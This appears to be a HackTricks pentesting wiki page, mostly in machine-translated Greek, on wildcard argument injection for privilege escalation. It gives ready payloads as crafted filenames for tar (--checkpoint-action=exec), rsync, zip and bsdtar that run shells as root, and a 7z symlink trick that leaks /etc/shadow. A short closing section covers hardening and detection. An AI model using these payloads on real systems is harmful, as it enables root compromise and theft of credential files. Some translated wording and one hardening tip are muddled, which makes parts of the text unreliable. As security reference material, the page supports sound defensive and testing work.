# Wildcards Spare Tricks

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **εισαγωγή επιχειρημάτων** συμβαίνει όταν ένα προνομιακό σενάριο εκτελεί ένα Unix δυαδικό όπως `tar`, `chown`, `rsync`, `zip`, `7z`, … με ένα μη παραquoted wildcard όπως `*`.
> Δεδομένου ότι το shell επεκτείνει το wildcard **πριν** εκτελέσει το δυαδικό, ένας επιτιθέμενος που μπορεί να δημιουργήσει αρχεία στον τρέχοντα κατάλογο μπορεί να κατασκευάσει ονόματα αρχείων που αρχίζουν με `-` ώστε να ερμηνεύονται ως **επιλογές αντί για δεδομένα**, αποτελεσματικά λαθραία σημαίες ή ακόμα και εντολές.
> Αυτή η σελίδα συγκεντρώνει τις πιο χρήσιμες πρωτογενείς μεθόδους, πρόσφατες έρευνες και σύγχρονες ανιχνεύσεις για το 2023-2025.

## chown / chmod

Μπορείτε να **αντιγράψετε τον ιδιοκτήτη/ομάδα ή τα δικαιώματα ενός αυθαίρετου αρχείου** εκμεταλλευόμενοι τη σημαία `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Όταν ο root εκτελεί αργότερα κάτι όπως:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` έχει εισαχθεί, προκαλώντας *όλα* τα αντίστοιχα αρχεία να κληρονομήσουν την ιδιοκτησία/δικαιώματα του `/root/secret``file`.

*PoC & εργαλείο*: [`wildpwn`](https://github.com/localh0t/wildpwn) (συνδυασμένη επίθεση).
Δείτε επίσης το κλασικό έγγραφο της DefenseCode για λεπτομέρειες.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Εκτελέστε αυθαίρετες εντολές εκμεταλλευόμενοι τη δυνατότητα **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Μόλις ο root εκτελέσει π.χ. `tar -czf /root/backup.tgz *`, το `shell.sh` εκτελείται ως root.

### bsdtar / macOS 14+

Ο προεπιλεγμένος `tar` σε πρόσφατο macOS (βασισμένος σε `libarchive`) *δεν* υλοποιεί το `--checkpoint`, αλλά μπορείτε να επιτύχετε εκτέλεση κώδικα με την επιλογή **--use-compress-program** που σας επιτρέπει να καθορίσετε έναν εξωτερικό συμπιεστή.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Όταν ένα προνομιακό σενάριο εκτελεί `tar -cf backup.tar *`, θα ξεκινήσει το `/bin/sh`.

---

## rsync

`rsync` σας επιτρέπει να παρακάμψετε το απομακρυσμένο κέλυφος ή ακόμη και το απομακρυσμένο δυαδικό μέσω σημαιών γραμμής εντολών που ξεκινούν με `-e` ή `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Αν ο root αργότερα αρχειοθετήσει τον κατάλογο με `rsync -az * backup:/srv/`, η εισαγόμενη σημαία δημιουργεί το shell σας στην απομακρυσμένη πλευρά.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Ακόμα και όταν το προνομιακό σενάριο *αμυντικά* προσθέτει το wildcard με `--` (για να σταματήσει την ανάλυση επιλογών), η μορφή 7-Zip υποστηρίζει **αρχεία λίστας αρχείων** προσθέτοντας το όνομα αρχείου με `@`. Συνδυάζοντας αυτό με ένα symlink σας επιτρέπει να *εξάγετε αυθαίρετα αρχεία*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Αν ο root εκτελέσει κάτι όπως:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip θα προσπαθήσει να διαβάσει `root.txt` (→ `/etc/shadow`) ως λίστα αρχείων και θα αποτύχει, **εκτυπώνοντας το περιεχόμενο στο stderr**.

---

## zip

`zip` υποστηρίζει τη σημαία `--unzip-command` που μεταφέρεται *κατά λέξη* στη γραμμή εντολών του συστήματος όταν θα δοκιμαστεί το αρχείο:
```bash
zip result.zip files -T --unzip-command "sh -c id"
```
Inject the flag via a crafted filename and wait for the privileged backup script to call `zip -T` (test archive) on the resulting file.

---

## Additional binaries vulnerable to wildcard injection (2023-2025 quick list)

The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:

| Binary | Flag to abuse | Effect |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Διαβάστε το περιεχόμενο του αρχείου |
| `flock` | `-c <cmd>` | Εκτέλεση εντολής |
| `git`   | `-c core.sshCommand=<cmd>` | Εκτέλεση εντολής μέσω git over SSH |
| `scp`   | `-S <cmd>` | Δημιουργία αυθαίρετου προγράμματος αντί για ssh |

These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.

---

## Detection & Hardening

1. **Disable shell globbing** in critical scripts: `set -f` (`set -o noglob`) prevents wildcard expansion.
2. **Quote or escape** arguments: `tar -czf "$dst" -- *` is *not* safe — prefer `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
3. **Explicit paths**: Use `/var/www/html/*.log` instead of `*` so attackers cannot create sibling files that start with `-`.
4. **Least privilege**: Run backup/maintenance jobs as an unprivileged service account instead of root whenever possible.
5. **Monitoring**: Elastic’s pre-built rule *Potential Shell via Wildcard Injection* looks for `tar --checkpoint=*`, `rsync -e*`, or `zip --unzip-command` immediately followed by a shell child process. The EQL query can be adapted for other EDRs.

---

## References

* Elastic Security – Potential Shell via Wildcard Injection Detected rule (last updated 2025)
* Rutger Flohil – “macOS — Tar wildcard injection” (Dec 18 2024)

{{#include ../../banners/hacktricks-training.md}}
